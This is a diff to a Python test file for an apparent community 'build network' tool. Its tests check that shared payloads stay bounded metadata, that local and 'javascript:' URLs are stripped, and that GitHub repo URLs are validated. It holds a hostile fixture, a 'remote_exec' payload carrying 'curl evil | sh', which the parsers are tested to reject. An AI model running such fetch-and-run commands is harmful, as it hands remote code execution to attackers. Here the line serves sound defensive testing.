@@ -32,7 +32,14 @@ from build_network_v2 import (
     SolutionVerification,
     parse_v2_payload,
 )
+from build_network_v3 import (
+    HelperAvailability,
+    ProjectActivity,
+    SetupComponentShare,
+    parse_v3_payload,
+)
 import build_network_app_v2 as app_v2
+import build_network_app_v3 as app_v3
 
 
 class BuildNetworkTests(unittest.TestCase):
@@ -139,6 +146,51 @@ class BuildNetworkTests(unittest.TestCase):
         payload = ChallengeJoin(challenge_id="challenge_123", repo_url="file:///tmp/team").to_payload()
         self.assertEqual(payload["repo_url"], "")
 
+    def test_v3_helper_availability_is_bounded_metadata(self):
+        payload = HelperAvailability(
+            mode="pair",
+            skills=["QML", "NVIDIA", "QML"],
+            environment_tags=["Omarchy 4.14", "NVIDIA"],
+            note="Happy to pair on a plugin",
+            available_minutes=999,
+        ).to_payload()
+        self.assertEqual(payload["mode"], "pair")
+        self.assertEqual(payload["skills"], ["QML", "NVIDIA"])
+        self.assertEqual(payload["available_minutes"], 240)
+        self.assertNotIn("command", payload)
+        self.assertEqual(parse_v3_payload(payload).mode, "pair")
+
+    def test_v3_setup_component_rejects_local_and_script_urls(self):
+        local = SetupComponentShare(component_type="bar", name="My bar", source_url="file:///home/me/bar.qml").to_payload()
+        script = SetupComponentShare(component_type="plugin", name="Bad", source_url="javascript:alert(1)").to_payload()
+        self.assertEqual(local["source_url"], "")
+        self.assertEqual(script["source_url"], "")
+        self.assertNotIn("contents", local)
+        self.assertNotIn("commands", local)
+
+    def test_v3_project_activity_is_link_metadata_only(self):
+        payload = ProjectActivity(
+            activity_type="pull_request",
+            title="Fix AMD rendering",
+            url="https://github.com/example/repo/pull/7",
+            repo_url="https://github.com/example/repo",
+            reference="#7",
+        ).to_payload()
+        self.assertEqual(payload["activity_type"], "pull_request")
+        self.assertEqual(payload["reference"], "#7")
+        self.assertNotIn("patch", payload)
+        self.assertNotIn("diff", payload)
+        self.assertNotIn("token", payload)
+
+    def test_github_snapshot_parser_only_accepts_public_github_repo_urls(self):
+        self.assertEqual(app_v3._github_repo_parts("https://github.com/harshithnadig/omarchy-friends"), ("harshithnadig", "omarchy-friends"))
+        with self.assertRaises(ValueError):
+            app_v3._github_repo_parts("http://github.com/example/repo")
+        with self.assertRaises(ValueError):
+            app_v3._github_repo_parts("https://example.com/owner/repo")
+        with self.assertRaises(ValueError):
+            app_v3._github_repo_parts("file:///home/user/repo")
+
     def test_safe_environment_has_no_identifying_fields(self):
         payload = app_v2.safe_environment()
         self.assertEqual(set(payload), {"tags", "omarchy_version", "architecture", "gpu_vendor", "kernel"})
@@ -146,13 +198,11 @@ class BuildNetworkTests(unittest.TestCase):
         for forbidden in ("hostname", "username", "ip_address", "serial", "home/"):
             self.assertNotIn(forbidden, serialized)
 
-    def test_social_parser_fails_closed_for_unknown_action(self):
-        with self.assertRaises(ValueError):
-            parse_social_payload({"type": "remote_exec", "command": "curl evil | sh"})
-
-    def test_v2_parser_fails_closed_for_unknown_action(self):
-        with self.assertRaises(ValueError):
-            parse_v2_payload({"type": "remote_exec", "command": "curl evil | sh"})
+    def test_all_extension_parsers_fail_closed_for_remote_execution(self):
+        malicious = {"type": "remote_exec", "command": "curl evil | sh"}
+        for parser in (parse_social_payload, parse_v2_payload, parse_v3_payload):
+            with self.assertRaises(ValueError):
+                parser(malicious)
 
     def test_unknown_core_payload_is_rejected(self):
         with self.assertRaises(ValueError):
